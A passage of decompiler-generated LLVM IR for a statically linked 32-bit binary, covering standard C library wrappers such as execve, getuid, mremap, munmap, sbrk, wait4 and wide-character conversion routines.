  store i32 %v0_8054724, i32* %stack_var_-4, align 4
  %v4_8054728 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8054728, i32* %edi.global-to-local, align 4
  %v0_8054734 = load i32, i32* @ebx, align 4
  %v5_805473c = insertvalue [1 x i8*] undef, i8* %tmp5, 0
  %v8_805473c = insertvalue [1 x i8*] undef, i8* %tmp, 0
  %v9_805473c = call i32 @execve(i8* %arg1, [1 x i8*] %v5_805473c, [1 x i8*] %v8_805473c)
  store i32 %v9_805473c, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v9_805473c, -4095
  br i1 %tmp12, label %dec_label_pc_8054754, label %dec_label_pc_8054748

dec_label_pc_8054748:                             ; preds = %entry
  %v1_8054748 = call i32 @__errno_location(i32 %v0_8054734)
  %v0_805474d = load i32, i32* %edi.global-to-local, align 4
  %v1_805474d = sub i32 0, %v0_805474d
  %v2_805474f = inttoptr i32 %v1_8054748 to i32*
  store i32 %v1_805474d, i32* %v2_805474f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8054754

dec_label_pc_8054754:                             ; preds = %entry, %dec_label_pc_8054748
  %v0_8054754 = phi i32 [ %v9_805473c, %entry ], [ -1, %dec_label_pc_8054748 ]
  %v2_8054756 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054756, i32* @edx, align 4
  %v2_8054758 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054758, i32* %edi.global-to-local, align 4
  ret i32 %v0_8054754

; uselistorder directives
  uselistorder i32 %v9_805473c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054754, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805475c = load i32, i32* @ebx, align 4
  store i32 %v0_805475c, i32* %stack_var_-4, align 4
  %v1_8054765 = call i32 @int80_syscall(i32 202)
  store i32 %v1_8054765, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8054765, -4095
  br i1 %tmp6, label %dec_label_pc_805477c, label %dec_label_pc_8054770

dec_label_pc_8054770:                             ; preds = %entry
  %v0_8054770 = load i32, i32* %stack_var_-4, align 4
  %v1_8054770 = call i32 @__errno_location(i32 %v0_8054770)
  %v0_8054775 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054775 = sub i32 0, %v0_8054775
  %v2_8054777 = inttoptr i32 %v1_8054770 to i32*
  store i32 %v1_8054775, i32* %v2_8054777, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805477c

dec_label_pc_805477c:                             ; preds = %entry, %dec_label_pc_8054770
  %v0_805477c = phi i32 [ %v1_8054765, %entry ], [ -1, %dec_label_pc_8054770 ]
  %v2_8054780 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054780, i32* @ebx, align 4
  ret i32 %v0_805477c

; uselistorder directives
  uselistorder i32 %v1_8054765, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 202, { 1, 0 }
  uselistorder label %dec_label_pc_805477c, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054784 = load i32, i32* @ebx, align 4
  store i32 %v0_8054784, i32* %stack_var_-4, align 4
  %v1_805478d = call i32 @int80_syscall(i32 201)
  store i32 %v1_805478d, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_805478d, -4095
  br i1 %tmp6, label %dec_label_pc_80547a4, label %dec_label_pc_8054798

dec_label_pc_8054798:                             ; preds = %entry
  %v0_8054798 = load i32, i32* %stack_var_-4, align 4
  %v1_8054798 = call i32 @__errno_location(i32 %v0_8054798)
  %v0_805479d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805479d = sub i32 0, %v0_805479d
  %v2_805479f = inttoptr i32 %v1_8054798 to i32*
  store i32 %v1_805479d, i32* %v2_805479f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80547a4

dec_label_pc_80547a4:                             ; preds = %entry, %dec_label_pc_8054798
  %v0_80547a4 = phi i32 [ %v1_805478d, %entry ], [ -1, %dec_label_pc_8054798 ]
  %v2_80547a8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80547a8, i32* @ebx, align 4
  ret i32 %v0_80547a4

; uselistorder directives
  uselistorder i32 %v1_805478d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 201, { 1, 0 }
  uselistorder label %dec_label_pc_80547a4, { 1, 0 }
}

define i32 @getgid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80547ac = load i32, i32* @ebx, align 4
  store i32 %v0_80547ac, i32* %stack_var_-4, align 4
  %v1_80547b5 = call i32 @int80_syscall(i32 200)
  store i32 %v1_80547b5, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_80547b5, -4095
  br i1 %tmp6, label %dec_label_pc_80547cc, label %dec_label_pc_80547c0

dec_label_pc_80547c0:                             ; preds = %entry
  %v0_80547c0 = load i32, i32* %stack_var_-4, align 4
  %v1_80547c0 = call i32 @__errno_location(i32 %v0_80547c0)
  %v0_80547c5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80547c5 = sub i32 0, %v0_80547c5
  %v2_80547c7 = inttoptr i32 %v1_80547c0 to i32*
  store i32 %v1_80547c5, i32* %v2_80547c7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80547cc

dec_label_pc_80547cc:                             ; preds = %entry, %dec_label_pc_80547c0
  %v0_80547cc = phi i32 [ %v1_80547b5, %entry ], [ -1, %dec_label_pc_80547c0 ]
  %v2_80547d0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80547d0, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80547cc

; uselistorder directives
  uselistorder i32 %v1_80547b5, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80547cc, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80547d4 = load i32, i32* @ebx, align 4
  store i32 %v0_80547d4, i32* %stack_var_-4, align 4
  %v1_80547dd = call i32 @int80_syscall(i32 199)
  store i32 %v1_80547dd, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_80547dd, -4095
  br i1 %tmp6, label %dec_label_pc_80547f4, label %dec_label_pc_80547e8

dec_label_pc_80547e8:                             ; preds = %entry
  %v0_80547e8 = load i32, i32* %stack_var_-4, align 4
  %v1_80547e8 = call i32 @__errno_location(i32 %v0_80547e8)
  %v0_80547ed = load i32, i32* %ebx.global-to-local, align 4
  %v1_80547ed = sub i32 0, %v0_80547ed
  %v2_80547ef = inttoptr i32 %v1_80547e8 to i32*
  store i32 %v1_80547ed, i32* %v2_80547ef, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80547f4

dec_label_pc_80547f4:                             ; preds = %entry, %dec_label_pc_80547e8
  %v0_80547f4 = phi i32 [ %v1_80547dd, %entry ], [ -1, %dec_label_pc_80547e8 ]
  %v2_80547f8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80547f8, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80547f4

; uselistorder directives
  uselistorder i32 %v1_80547dd, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 199, { 1, 0 }
  uselistorder label %dec_label_pc_80547f4, { 1, 0 }
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80547fc = load i32, i32* @edi, align 4
  %v0_80547fd = load i32, i32* @esi, align 4
  store i32 %v0_80547fd, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_8054815 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v6_805481d = call i32 @mremap(i32 %v0_8054815, i32 %v0_80547fd, i32 %v0_80547fc, i32 %tmp6, i32 %arg1, i32 %arg2)
  store i32 %v0_8054815, i32* @ebx, align 4
  store i32 %v6_805481d, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v6_805481d, -4095
  br i1 %tmp11, label %dec_label_pc_8054835, label %dec_label_pc_8054829

dec_label_pc_8054829:                             ; preds = %entry
  %v1_8054829 = call i32 @__errno_location(i32 %v0_8054815)
  %v0_805482e = load i32, i32* %esi.global-to-local, align 4
  %v1_805482e = sub i32 0, %v0_805482e
  %v2_8054830 = inttoptr i32 %v1_8054829 to i32*
  store i32 %v1_805482e, i32* %v2_8054830, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054835

dec_label_pc_8054835:                             ; preds = %entry, %dec_label_pc_8054829
  %v0_8054835 = phi i32 [ %v6_805481d, %entry ], [ -1, %dec_label_pc_8054829 ]
  %v2_8054837 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054837, i32* @edx, align 4
  %v2_8054838 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8054838, i32* @esi, align 4
  store i32 %v0_80547fc, i32* @edi, align 4
  ret i32 %v0_8054835

; uselistorder directives
  uselistorder i32 %v6_805481d, { 1, 0, 2 }
  uselistorder i32 %v0_8054815, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mremap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054835, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805483c = load i32, i32* @ebx, align 4
  store i32 %v0_805483c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_805484f = call i32 @munmap(i32 %v0_805483c, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_805484f, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v4_805484f, -4095
  br i1 %tmp8, label %dec_label_pc_8054868, label %dec_label_pc_805485c

dec_label_pc_805485c:                             ; preds = %entry
  %v0_805485c = load i32, i32* %stack_var_-4, align 4
  %v1_805485c = call i32 @__errno_location(i32 %v0_805485c)
  %v0_8054861 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054861 = sub i32 0, %v0_8054861
  %v2_8054863 = inttoptr i32 %v1_805485c to i32*
  store i32 %v1_8054861, i32* %v2_8054863, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054868

dec_label_pc_8054868:                             ; preds = %entry, %dec_label_pc_805485c
  %v0_8054868 = phi i32 [ %v4_805484f, %entry ], [ -1, %dec_label_pc_805485c ]
  %v2_805486a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805486a, i32* @edx, align 4
  %v2_805486c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805486c, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054868

; uselistorder directives
  uselistorder i32 %v4_805484f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @munmap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054868, { 1, 0 }
}

define i32 @__libc_nanosleep(%timespec* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054870 = load i32, i32* @ebx, align 4
  store i32 %v0_8054870, i32* %stack_var_-4, align 4
  %v4_8054874 = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_8054874, i32* %ebx.global-to-local, align 4
  %v6_8054883 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp4)
  store i32 %v6_8054883, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v6_8054883, -4095
  br i1 %tmp10, label %dec_label_pc_805489c, label %dec_label_pc_8054890

dec_label_pc_8054890:                             ; preds = %entry
  %v0_8054890 = load i32, i32* %stack_var_-4, align 4
  %v1_8054890 = call i32 @__errno_location(i32 %v0_8054890)
  %v0_8054895 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054895 = sub i32 0, %v0_8054895
  %v2_8054897 = inttoptr i32 %v1_8054890 to i32*
  store i32 %v1_8054895, i32* %v2_8054897, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805489c

dec_label_pc_805489c:                             ; preds = %entry, %dec_label_pc_8054890
  %v0_805489c = phi i32 [ %v6_8054883, %entry ], [ -1, %dec_label_pc_8054890 ]
  %v2_805489e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805489e, i32* @edx, align 4
  %v2_80548a0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80548a0, i32* @ebx, align 4
  ret i32 %v0_805489c

; uselistorder directives
  uselistorder i32 %v6_8054883, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805489c, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_80548a5 = load i32, i32* @ebx, align 4
  %v0_80548a9 = load i32, i32* @global_var_80617c4.540, align 4
  %v1_80548a9 = icmp eq i32 %v0_80548a9, 0
  %v1_80548b4 = icmp eq i1 %v1_80548a9, false
  br i1 %v1_80548b4, label %dec_label_pc_80548c7, label %dec_label_pc_80548b6

dec_label_pc_80548b6:                             ; preds = %entry
  %v1_80548bb = call i32 @__GI_brk(i32 0)
  %v2_80548c3 = icmp slt i32 %v1_80548bb, 0
  br i1 %v2_80548c3, label %dec_label_pc_80548e9, label %dec_label_pc_80548b6.dec_label_pc_80548c7_crit_edge

dec_label_pc_80548b6.dec_label_pc_80548c7_crit_edge: ; preds = %dec_label_pc_80548b6
  %v0_80548c9.pre = load i32, i32* @global_var_80617c4.540, align 4
  br label %dec_label_pc_80548c7

dec_label_pc_80548c7:                             ; preds = %dec_label_pc_80548b6.dec_label_pc_80548c7_crit_edge, %entry
  %v0_80548d7 = phi i32 [ %v0_80548c9.pre, %dec_label_pc_80548b6.dec_label_pc_80548c7_crit_edge ], [ %v0_80548a9, %entry ]
  %v1_80548c7 = icmp eq i32 %arg1, 0
  %v1_80548ce = icmp eq i1 %v1_80548c7, false
  br i1 %v1_80548ce, label %dec_label_pc_80548d4, label %dec_label_pc_80548d0

dec_label_pc_80548d0:                             ; preds = %dec_label_pc_80548c7
  br label %dec_label_pc_80548ec

dec_label_pc_80548d4:                             ; preds = %dec_label_pc_80548c7
  store i32 %v0_80548d7, i32* @ebx, align 4
  %v2_80548d9 = add i32 %v0_80548d7, %arg1
  %v1_80548dd = call i32 @__GI_brk(i32 %v2_80548d9)
  %v2_80548e5 = icmp slt i32 %v1_80548dd, 0
  %v1_80548e7 = icmp eq i1 %v2_80548e5, false
  br i1 %v1_80548e7, label %dec_label_pc_80548d4.dec_label_pc_80548ec_crit_edge, label %dec_label_pc_80548e9

dec_label_pc_80548d4.dec_label_pc_80548ec_crit_edge: ; preds = %dec_label_pc_80548d4
  %v0_80548ec.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80548ec

dec_label_pc_80548e9:                             ; preds = %dec_label_pc_80548d4, %dec_label_pc_80548b6
  br label %dec_label_pc_80548ec

dec_label_pc_80548ec:                             ; preds = %dec_label_pc_80548d4.dec_label_pc_80548ec_crit_edge, %dec_label_pc_80548d0, %dec_label_pc_80548e9
  %v0_80548ec = phi i32 [ %v0_80548ec.pre, %dec_label_pc_80548d4.dec_label_pc_80548ec_crit_edge ], [ %v0_80548d7, %dec_label_pc_80548d0 ], [ -1, %dec_label_pc_80548e9 ]
  %v2_80548ee = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80548ee, i32* @edx, align 4
  store i32 %v0_80548a5, i32* @ebx, align 4
  ret i32 %v0_80548ec

; uselistorder directives
  uselistorder i32 %v0_80548d7, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_80548ec, { 2, 0, 1 }
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80548f4 = load i32, i32* @edi, align 4
  %v0_80548f5 = load i32, i32* @esi, align 4
  store i32 %v0_80548f5, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg4, i32* @esi, align 4
  %v0_8054909 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_8054911 = call i32 @wait4(i32 %v0_8054909, i32 %v0_80548f5, i32 %v0_80548f4, i32 %tmp5)
  store i32 %v0_8054909, i32* @ebx, align 4
  store i32 %v4_8054911, i32* %esi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v4_8054911, -4095
  br i1 %tmp10, label %dec_label_pc_8054929, label %dec_label_pc_805491d

dec_label_pc_805491d:                             ; preds = %entry
  %v1_805491d = call i32 @__errno_location(i32 %v0_8054909)
  %v0_8054922 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054922 = sub i32 0, %v0_8054922
  %v2_8054924 = inttoptr i32 %v1_805491d to i32*
  store i32 %v1_8054922, i32* %v2_8054924, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054929

dec_label_pc_8054929:                             ; preds = %entry, %dec_label_pc_805491d
  %v0_8054929 = phi i32 [ %v4_8054911, %entry ], [ -1, %dec_label_pc_805491d ]
  %v2_805492b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805492b, i32* @edx, align 4
  %v2_805492c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805492c, i32* @esi, align 4
  store i32 %v0_80548f4, i32* @edi, align 4
  ret i32 %v0_8054929

; uselistorder directives
  uselistorder i32 %v4_8054911, { 1, 0, 2 }
  uselistorder i32 %v0_8054909, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @wait4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8054929, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_80617a4.541 to i32)
}

define i32 @__GI_wcrtomb() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_8054943 = icmp eq i32 %tmp5, 0
  %v1_8054945 = icmp eq i1 %v1_8054943, false
  br i1 %v1_8054945, label %dec_label_pc_805494d, label %dec_label_pc_8054947

dec_label_pc_8054947:                             ; preds = %entry
  %v2_8054947 = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_805494d

dec_label_pc_805494d:                             ; preds = %entry, %dec_label_pc_8054947
  %v0_8054969 = phi i32 [ %tmp5, %entry ], [ %v2_8054947, %dec_label_pc_8054947 ]
  %v0_8054951 = phi i32 [ %tmp4, %entry ], [ 0, %dec_label_pc_8054947 ]
  %v2_805494d = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v0_8054951, i32* %stack_var_-4, align 4
  store i32 %v2_805494d, i32* %stack_var_-8, align 4
  %v2_8054964 = ptrtoint i32* %stack_var_-8 to i32
  %v5_805496a = inttoptr i32 %v0_8054969 to i8*
  %v6_805496a = call i32 @__GI_wcsnrtombs(i8* %v5_805496a, i32 %v2_8054964, i32 1, i32 16, i32 %tmp)
  %v1_8054972 = icmp eq i32 %v6_805496a, 0
  %v1_8054974 = icmp eq i1 %v1_8054972, false
  br i1 %v1_8054974, label %dec_label_pc_8054978, label %dec_label_pc_8054976

dec_label_pc_8054976:                             ; preds = %dec_label_pc_805494d
  %v1_8054976 = and i32 %v6_805496a, -256
  %v2_8054976 = or i32 %v1_8054976, 1
  br label %dec_label_pc_8054978

dec_label_pc_8054978:                             ; preds = %dec_label_pc_805494d, %dec_label_pc_8054976
  %v0_805497b = phi i32 [ %v6_805496a, %dec_label_pc_805494d ], [ %v2_8054976, %dec_label_pc_8054976 ]
  ret i32 %v0_805497b

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_8054978, { 1, 0 }
  uselistorder label %dec_label_pc_805494d, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_8054991 = inttoptr i32 %tmp to i8*
  %v6_8054991 = call i32 @__GI_wcsnrtombs(i8* %v5_8054991, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_8054991
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_805499f = load i32, i32* @ebx, align 4
  %v4_80549a3 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80549a3, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  store i32 %arg4, i32* %eax.global-to-local, align 4
  %v1_80549af = icmp eq i8* %arg1, null
  br i1 %v1_80549af, label %dec_label_pc_80549e3.thread, label %dec_label_pc_80549b3

dec_label_pc_80549b3:                             ; preds = %entry
  store i32 1, i32* %edi.global-to-local, align 4
  %v12_80549b8 = icmp eq i32 %v4_80549a3, %arg2
  %v1_80549ba = icmp eq i1 %v12_80549b8, false
  br i1 %v1_80549ba, label %dec_label_pc_80549e3, label %dec_label_pc_80549dd

dec_label_pc_80549e3.thread:                      ; preds = %entry
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_80549c0 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80549c0, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80549ed

dec_label_pc_80549c9:                             ; preds = %dec_label_pc_80549f4
  %v1_80549c9 = call i32 @__errno_location(i32 %v0_805499f)
  store i32 %v1_80549c9, i32* %eax.global-to-local, align 4
  %v1_80549ce = inttoptr i32 %v1_80549c9 to i32*
  store i32 84, i32* %v1_80549ce, align 4
  br label %dec_label_pc_8054a1a

dec_label_pc_80549d9:                             ; preds = %dec_label_pc_80549fb
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_8054a0f.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054a0b

dec_label_pc_80549dd:                             ; preds = %dec_label_pc_80549b3
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_80549df = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80549df, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80549e3

dec_label_pc_80549e3:                             ; preds = %dec_label_pc_80549b3, %dec_label_pc_80549dd
  %v2_80549fb15 = phi i32 [ %v4_80549a3, %dec_label_pc_80549b3 ], [ %v2_80549df, %dec_label_pc_80549dd ]
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %tmp33 = icmp ult i32 %arg4, %arg3
  br i1 %tmp33, label %dec_label_pc_80549eb, label %dec_label_pc_80549ed

dec_label_pc_80549eb:                             ; preds = %dec_label_pc_80549e3
  store i32 %arg4, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80549ed

dec_label_pc_80549ed:                             ; preds = %dec_label_pc_80549e3.thread, %dec_label_pc_80549e3, %dec_label_pc_80549eb
  %v2_80549fb1532 = phi i32 [ %v2_80549fb15, %dec_label_pc_80549e3 ], [ %v2_80549fb15, %dec_label_pc_80549eb ], [ %v2_80549c0, %dec_label_pc_80549e3.thread ]
  %v0_80549f0 = phi i32 [ %arg3, %dec_label_pc_80549e3 ], [ %arg4, %dec_label_pc_80549eb ], [ %arg3, %dec_label_pc_80549e3.thread ]
  %v1_80549ed = inttoptr i32 %arg2 to i32*
  %v2_80549ed = load i32, i32* %v1_80549ed, align 4
  store i32 %v2_80549ed, i32* %esi.global-to-local, align 4
  store i32 %v0_80549f0, i32* @ecx, align 4
  %v1_8054a073 = icmp eq i32 %v0_80549f0, 0
  %v1_8054a0910 = icmp eq i1 %v1_8054a073, false
  br i1 %v1_8054a0910, label %dec_label_pc_80549f4, label %dec_label_pc_8054a0b

dec_label_pc_80549f4:                             ; preds = %dec_label_pc_80549ed, %dec_label_pc_8054a01
  %v2_80549fb = phi i32 [ %v2_8054a04, %dec_label_pc_8054a01 ], [ %v2_80549fb1532, %dec_label_pc_80549ed ]
  %v0_80549f4 = phi i32 [ %v1_8054a01, %dec_label_pc_8054a01 ], [ %v2_80549ed, %dec_label_pc_80549ed ]
  %v1_80549f4 = inttoptr i32 %v0_80549f4 to i32*
  %v2_80549f4 = load i32, i32* %v1_80549f4, align 4
  store i32 %v2_80549f4, i32* %eax.global-to-local, align 4
  %v6_80549f9 = icmp ugt i32 %v2_80549f4, 127
  br i1 %v6_80549f9, label %dec_label_pc_80549c9, label %dec_label_pc_80549fb

dec_label_pc_80549fb:                             ; preds = %dec_label_pc_80549f4
  %v1_80549fb = trunc i32 %v2_80549f4 to i8
  %v3_80549fb = inttoptr i32 %v2_80549fb to i8*
  store i8 %v1_80549fb, i8* %v3_80549fb, align 1
  %v0_80549fd = load i32, i32* %eax.global-to-local, align 4
  %v3_80549fd = trunc i32 %v0_80549fd to i8
  %v4_80549fd = icmp eq i8 %v3_80549fd, 0
  br i1 %v4_80549fd, label %dec_label_pc_80549d9, label %dec_label_pc_8054a01

dec_label_pc_8054a01:                             ; preds = %dec_label_pc_80549fb
  %v0_8054a01 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054a01 = add i32 %v0_8054a01, 4
  store i32 %v1_8054a01, i32* %esi.global-to-local, align 4
  %v0_8054a04 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054a04 = load i32, i32* %edi.global-to-local, align 4
  %v2_8054a04 = add i32 %v1_8054a04, %v0_8054a04
  store i32 %v2_8054a04, i32* %edx.global-to-local, align 4
  %v0_8054a06 = load i32, i32* @ecx, align 4
  %v1_8054a06 = add i32 %v0_8054a06, -1
  %v8_8054a06 = icmp eq i32 %v1_8054a06, 0
  store i32 %v1_8054a06, i32* @ecx, align 4
  %v1_8054a09 = icmp eq i1 %v8_8054a06, false
  br i1 %v1_8054a09, label %dec_label_pc_80549f4, label %dec_label_pc_8054a0b

dec_label_pc_8054a0b:                             ; preds = %dec_label_pc_8054a01, %dec_label_pc_80549ed, %dec_label_pc_80549d9
  %v0_8054a13 = phi i32 [ 0, %dec_label_pc_80549d9 ], [ %v2_80549ed, %dec_label_pc_80549ed ], [ %v1_8054a01, %dec_label_pc_8054a01 ]
  %v0_8054a0f = phi i32 [ %v0_8054a0f.pre, %dec_label_pc_80549d9 ], [ %v2_80549fb1532, %dec_label_pc_80549ed ], [ %v2_8054a04, %dec_label_pc_8054a01 ]
  %v2_8054a0b = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8054a0b, i32* %eax.global-to-local, align 4
  %v12_8054a0f = icmp eq i32 %v0_8054a0f, %v2_8054a0b
  br i1 %v12_8054a0f, label %dec_label_pc_8054a16, label %dec_label_pc_8054a13

dec_label_pc_8054a13:                             ; preds = %dec_label_pc_8054a0b
  %v1_8054a13 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8054a13 = inttoptr i32 %v1_8054a13 to i32*
  store i32 %v0_8054a13, i32* %v2_8054a13, align 4
  br label %dec_label_pc_8054a16

dec_label_pc_8054a16:                             ; preds = %dec_label_pc_8054a0b, %dec_label_pc_8054a13
  %v0_8054a16 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8054a16, i32* %eax.global-to-local, align 4
  %v1_8054a18 = load i32, i32* @ecx, align 4
  %v2_8054a18 = sub i32 %v0_8054a16, %v1_8054a18
  br label %dec_label_pc_8054a1a

dec_label_pc_8054a1a:                             ; preds = %dec_label_pc_80549c9, %dec_label_pc_8054a16
